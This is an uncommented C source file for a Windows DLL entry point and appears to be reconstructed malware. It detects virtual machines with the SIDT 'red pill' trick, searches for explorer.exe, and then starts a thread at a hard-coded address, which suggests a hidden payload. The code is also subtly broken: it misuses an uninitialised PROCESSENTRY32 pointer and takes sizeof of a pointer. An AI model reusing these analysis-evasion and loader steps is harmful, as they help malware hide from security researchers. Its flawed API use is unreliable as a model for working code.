#include <windows.h>
#include <intrin.h> 
#include <tlhelp32.h>

typedef struct _IDTR {
	DWORD base;
	SHORT size;
} IDTR, * PIDTR;

BOOL __stdcall DllMain(HINSTANCE hinstDll, DWORD fdwReason, LPVOID lpvReserved) {
	IDTR idtr;
	__sidt(&idtr);
	if (idtr.base > 0x8003f400 && idtr.base < 0x80047400)
		return 0;

	PROCESSENTRY32* procEntry;
	memset(&procEntry, 0, sizeof(PROCESSENTRY32));
	HANDLE hSnapshot;
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE)
		return 0;

	procEntry->dwSize = sizeof procEntry;
	if (Process32First(hSnapshot, &procEntry) != FALSE)
		if (stricmp(procEntry->szExeFile, "explorer.exe") != 0) {
			while (Process32Next(hSnapshot, &procEntry) != FALSE)
				if (stricmp(procEntry->szExeFile, "explorer.exe") == 0)
					break;
		}

	if (procEntry->th32ParentProcessID == procEntry->th32ProcessID)
		return 0;

	if (fdwReason == DLL_PROCESS_DETACH)
		return 0;

	if (fdwReason == DLL_THREAD_ATTACH || fdwReason == DLL_THREAD_DETACH)
		return 1;

	CreateThread(0, 0, (LPTHREAD_START_ROUTINE)0x100032D0, 0, 0, 0);
	return 1;
}